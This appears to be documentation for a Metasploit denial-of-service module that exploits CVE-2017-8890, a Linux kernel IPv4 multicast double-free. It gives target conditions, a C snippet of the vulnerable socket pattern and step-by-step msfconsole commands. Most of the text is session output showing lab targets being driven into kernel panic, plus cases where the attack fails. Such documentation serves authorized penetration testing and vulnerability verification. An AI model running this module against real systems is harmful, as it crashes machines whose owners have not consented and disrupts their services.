## Vulnerable Machine

    1. Target is a Linux machine of kernel version 4.11 or below.
    2. Target is listening for a connection and calls accept(). Listener socket must be in the multicast group.
       Here's a sample of #2 written in C:
       ```
       sockfd = socket(AF_INET, ...);
       setsockopt(sockfd, SOL_IP, MCAST_JOIN_GROUP, ...);
       bind(sockfd, ...);
       listen(sockfd, ...)
       newsockfd = accept(sockfd, ...);
       close(newsockfd);  // first free
       close(sockfd);     // second free
       ```
    3. Target can be reached over the network.

## Verification Steps

    1. Start `msfconsole`
    2. Do: `use auxiliary/dos/linux/mcast_dfree`
    3. Do: `set RHOSTS <listener socket address>`
    4. Do: `set RPORT <listener port>`
    5. Do: `set WAIT_DOS <seconds to wait for DoS>`
    6. Do: `run`
    7. Module will ping and attempt to connect to the vulnerable target machine.

## Options

* `WAIT_DOS`: Integer value represents amount of seconds to sleep the module before attempting to ping after the connection to the target. The default is 15. The time from double free to kernel panic may vary depending on kernel version and other factors.

## Scenarios

This IPv4 double-free vulnerability (CVE 2017-8890, part of "Phoenix Talon" class of vulnerabilities) exists in kernel versions 4.11 and below. This module has been tested with the target machine running each of the following CVE 2017-8890-vulnerable kernels:
* Linux Kernel Version 4.10.0-041000rc5-generic
* Linux Kernel Version 4.10.15-041015-generic
* Linux Kernel Version 4.10.17-041016-generic
* Linux Kernel Version 4.11.0-041100-generic

The above four kernels yield the following behavior from this module:
```
msf5 > use auxiliary/dos/linux/mcast_dfree
msf5 auxiliary(dos/linux/mcast_dfree) > show options

Module options (auxiliary/dos/linux/mcast_dfree):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOSTS    127.0.0.1        yes       The target address range or CIDR identifier
   RPORT     4444             yes       The target port (TCP)
   WAIT_DOS  15               yes       Time to wait for target kernel to panic (in seconds)

msf5 auxiliary(dos/linux/mcast_dfree) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf5 auxiliary(dos/linux/mcast_dfree) > set RPORT 6666
RPORT => 6666
msf5 auxiliary(dos/linux/mcast_dfree) > set WAIT_DOS 35
WAIT_DOS => 35
msf5 auxiliary(dos/linux/mcast_dfree) > run
[*] Running module against 192.168.56.101

[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - Target machine is running.
[+] 192.168.56.101:6666 - Connection successfuly established with 192.168.56.101:6666
[*] 192.168.56.101:6666 - Waiting for 35 seconds...
[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - No reply from target machine post-connection.
[*] Auxiliary module execution completed
```

Note: As mentioned above, the `WAIT_DOS` value may need to be increased in order for the module to catch that the DoS succeeded. For instance, with a target running kernel version 4.10.17, this was necessary:
```
msf5 > use auxiliary/dos/linux/mcast_dfree
msf5 auxiliary(dos/linux/mcast_dfree) > show options

Module options (auxiliary/dos/linux/mcast_dfree):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOSTS    127.0.0.1        yes       The target address range or CIDR identifier
   RPORT     4444             yes       The target port (TCP)
   WAIT_DOS  15               yes       Time to wait for target kernel to panic (in seconds)

msf5 auxiliary(dos/linux/mcast_dfree) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf5 auxiliary(dos/linux/mcast_dfree) > set RPORT 6666
RPORT => 6666
msf5 auxiliary(dos/linux/mcast_dfree) > run
[*] Running module against 192.168.56.101

[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - Target machine is running.
[+] 192.168.56.101:6666 - Connection successfuly established with 192.168.56.101:6666
[*] 192.168.56.101:6666 - Waiting for 15 seconds...
[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[-] 192.168.56.101:6666 - Target machine responsive. DoS failed.
[*] Auxiliary module execution completed
msf5 auxiliary(dos/linux/mcast_dfree) > set WAIT_DOS 35
WAIT_DOS => 35
msf5 auxiliary(dos/linux/mcast_dfree) > run
[*] Running module against 192.168.56.101

[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - Target machine is running.
[+] 192.168.56.101:6666 - Connection successfuly established with 192.168.56.101:6666
[*] 192.168.56.101:6666 - Waiting for 35 seconds...
[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - No reply from target machine post-connection.
[*] Auxiliary module execution completed
```
But in the other three versions tested, the default 15 seconds sufficed.

This module has also been tested with known patched kernels (not vulnerable to CVE 2017-8890) such as 4.12. The behavior for a non-vulnerable target is as follows:
```
msf5 auxiliary(dos/linux/mcast_dfree) > run
[*] Running module against 192.168.56.101

[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - Target machine is running.
[+] 192.168.56.101:6666 - Connection successfuly established with 192.168.56.101:6666
[*] 192.168.56.101:6666 - Waiting for 35 seconds...
[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[-] 192.168.56.101:6666 - Target machine responsive. DoS failed.
[*] Auxiliary module execution completed
```
If the target machine is not listening, the module will fail:
```
msf5 auxiliary(dos/linux/mcast_dfree) > run
[*] Running module against 192.168.56.101

[*] 192.168.56.101:6666 - Pinging the target machine at 192.168.56.101
[+] 192.168.56.101:6666 - Target machine is running.
[-] 192.168.56.101:6666 - Failed to connect to 192.168.56.101:6666. Connection refused. Make sure target is listening.
[*] Auxiliary module execution completed
```
